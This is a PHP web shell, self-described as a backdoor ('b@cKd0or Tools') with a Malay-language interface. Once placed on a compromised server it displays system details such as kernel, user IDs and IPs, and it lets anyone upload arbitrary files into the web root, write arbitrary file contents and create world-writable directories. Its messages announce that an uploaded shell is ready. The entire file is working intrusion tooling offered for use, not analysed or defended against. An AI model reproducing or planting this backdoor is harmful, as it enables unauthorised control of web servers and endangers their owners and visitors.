<?php
			
echo "<title>b@cKd0or Cepat dan Pantas(PCP)</title>";
echo "<style> a{text-decoration: none;} .txtbiasa{font: 12pt Lora;color:Grey;} </style>";
echo "<center><font color='green' ><h1><b><i>b@cKd0or Tools(Dikode Oleh Harith101)<br>Pengurusan Cepat dan Pantas(PCP)</i></b></h1></font><br>";
/*echo php_uname(),"<br>";
echo gethostbyname($_SERVER["HTTP_HOST"]),"<br>";
echo $_SERVER["REMOTE_ADDR"],"<br><br>";*/
$capemode = (@ini_get(strtolower("safe_mode")) == 'on') ? "<font color=darkgreen>ON</font>" : "<font color=#80f426>OFF</font>";	
	?>
			<span class="txtbiasa">Kernel : <font color="#2672f4"><?php echo php_uname();?></font></span><br>
			<span class="txtbiasa">Sofware : <font color="#2672f4"><?php echo $_SERVER["SERVER_SOFTWARE"]; ?></font></span><br>
			<span class="txtbiasa">Space : <font color="#2672f4"><?php echo hdd(disk_free_space("/")) ?></font></span>
			<span class="txtbiasa"> / <font color="#2672f4"><?php echo hdd(disk_total_space("/")); ?></font></span><br>
			<span class="txtbiasa">User : <font color="#2672f4"><?php echo ''.@get_current_user().' | '; ?></font></span>
			<span class="txtbiasa">Uid : <font color="#2672f4"><?php echo '('.@getmyuid().') | '; ?></font></span>
			<span class="txtbiasa">Gid : <font color="#2672f4"><?php echo '('.@getmygid().')'; ?></font></span><br>
			<span class="txtbiasa">Server IP : <font color="#2672f4"><?php echo gethostbyname($_SERVER["HTTP_HOST"]); ?></font></span>
			<span class="txtbiasa">Your IP : <font color="#2672f4"><?php echo $_SERVER["REMOTE_ADDR"]; ?></font></span><br>
			<span class="txtbiasa">SafeMode : <?php echo $capemode; ?></span><br><br><br>
	
<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">

<h1> <font color="LightBlue" >Settinng Dulu Hanat !!! Pilih Ni !!! </font></h1>
Root Folder : <input type="radio" name="pilihan" value="rotdir"><?php echo $_SERVER['DOCUMENT_ROOT']."/"; ?> &nbsp;&nbsp;&nbsp;
<?php if(is_writable($_SERVER['DOCUMENT_ROOT'])) {
	echo "<font color=green> Writeable </font> ";
	
	}else{ echo "<font color=red>Not Writeable</font>"; }	?>
<br>
Atau : <input type="radio" name="pilihan" value="nordir"><?php echo getcwd(); ?> &nbsp;&nbsp;&nbsp;
<?php 
$j = getcwd();
if(is_writable($j)) {
	echo "<font color=green> Writeable </font> ";
	
	}else{ echo "<font color=red>Not Writeable</font>"; }	?>
<br><br><br><hr><h1> Upload </h1>
<input type="file" name="file" size="50">
<input name="_upl" type="submit" id="_upl" value="Upload"><br>
<?php 
// @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ Upload @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
	if( $_POST['_upl'] == "Upload" ) 
	{
		if($_POST['pilihan'] == 'rotdir') 
		{
			$oo = $_SERVER['DOCUMENT_ROOT']."/".$_FILES['file']['name'];
			$web = $_SERVER['HTTP_HOST']."/".$_FILES['file']['name'];
				if(@copy($_FILES['file']['tmp_name'], $oo)) {
					date_default_timezone_set('Kuala Lumpur, Singapore');
					echo '<center><b><i> <a href="http://'.$web.'" target="_blank">Shell Hang dh siap. Tekan Sini </a><br>Saiz : '.hdd($_FILES['file']['size']).'<br>Tarikh : '.date ("F d Y H:i:s.", filemtime($_FILES['file']['tmp_name'], $oo)).'<br><br></b></i> </   ';
				} else {
					echo '<center><b> Gagal !</b><br><br></center>';
				}
		}else {
			
					if($_POST['pilihan'] == 'nordir') 
						{
							date_default_timezone_set('Kuala Lumpur, Singapore');
							if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { echo '<center><b><i> <a href="'.$_FILES['file']['name'].'"/>Shell Hang dh siap. Tekan Sini </a><br>Saiz : '.hdd($_FILES['file']['size']).'<br>Tarikh : '.date ("F d Y H:i:s.", filemtime($_FILES['file']['name'])).'<br><br></b></i> </   '; }
							else { echo '<center><b> Gagal !</b><br><br></center>'; }				
						}
		
			}	
	}
// @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ Upload @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
?>
<!-- @@@@@@@@@@@@@@@@@@@@@@@@@@ BUAT FILE @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ -!-->
<hr>
<h1> Buat File </h1>
<br>
Nama File : <input type="text" placeholder="Nama File hanat" name="namafile"><br><br>
<textarea placeholder="Isi"  class="area" rows="18" cols="65" name="isi"></textarea><br>
<input name="bapakfile" type="submit" id="bapakfile" value="Buat File"><br>
<?php 
	if( $_POST['bapakfile'] == "Buat File" ) 
	{ 
		if($_POST['pilihan'] == 'rotdir')
		{
			if(is_writable($_SERVER['DOCUMENT_ROOT'])) {			
			$oo = $_SERVER['DOCUMENT_ROOT']."/".$_FILES['file']['name'];
			$i = $oo.$_POST['namafile'];
			$web = $_SERVER['HTTP_HOST']."/".$_POST['namafile'];
			$ooo = $_POST['isi'];
		    $file = fopen($i,"a");
		    $content = $ooo;
		    $dog = fwrite($file,$content);
			if(is_writable($_SERVER['DOCUMENT_ROOT'])) {
				if($dog)
				{
					echo "Dh berjya weh. <a href='http://$web' target='_blank'>Bukak Sini </a><br>";
				}
			}else { echo "Gagal Bodos . File not writeable <br>"; }
		    fclose($file);	
			}else { echo "Gagal Bodos . File not writeable <br>"; }			
		}else {
			if($_POST['pilihan'] == 'nordir')
			{
				$oo = $_POST['namafile'];
				$ooo = $_POST['isi'];			
				$file = fopen($oo,"w");
				$content = $ooo;
				$dog = fwrite($file,$content);
					if($dog)
					{
						echo "Dh berjya weh. <a href='".$_POST['namafile']."' target='_blank'>Bukak Sini </a><br>";
					}else { echo "Gagal Bodos <br>"; }
				fclose($file);					
			}
		}
	}

?>
<hr><h1> Buat Directory Baru </h1><br>
Nama File : <input type="text" placeholder="Nama Dir Hanat" name="namadir"><br><br>
<input name="makdir" type="submit" id="makdir" value="Buat Directory"><br>
<?php 
	if( $_POST['makdir'] == "Buat Directory" ) 
	{
		if($_POST['pilihan'] == 'rotdir')
		{
			if(is_writable($_SERVER['DOCUMENT_ROOT'])) 		
			{
				$oo = $_SERVER['DOCUMENT_ROOT']."/".$_FILES['file']['name'];
				$i = $oo.$_POST['namadir'];
				$web = $_SERVER['HTTP_HOST']."/".$_POST['namadir'];				
				
				if (!is_dir($i)) {
					mkdir($i, 0777, true);
					Echo "Dh Berjya. <a href='http://$web' target='_blank'> Tekan Sini </a> <br>";
				}else { echo "Gagal"; }				
				
			}else { echo "Gagal Bodos . File not writeable <br>"; }		
		}else{
			if($_POST['pilihan'] == 'nordir')
			{
				$oo = $_POST['namadir'];
				if (!is_dir($oo)) {
					mkdir($oo, 0777, true);
					Echo "Dh Berjya. <a href='$oo' target='_blank'> Tekan Sini </a> <br>";
				}else { echo "Gagal<br>"; }						
			}
			
		}
	}

?>
</form>
</center>
<?php
function hdd($s) {
if($s >= 1073741824)
return sprintf('%1.2f',$s / 1073741824 ).' GB';
elseif($s >= 1048576)
return sprintf('%1.2f',$s / 1048576 ) .' MB';
elseif($s >= 1024)
return sprintf('%1.2f',$s / 1024 ) .' KB';
else
return $s .' B';
}?>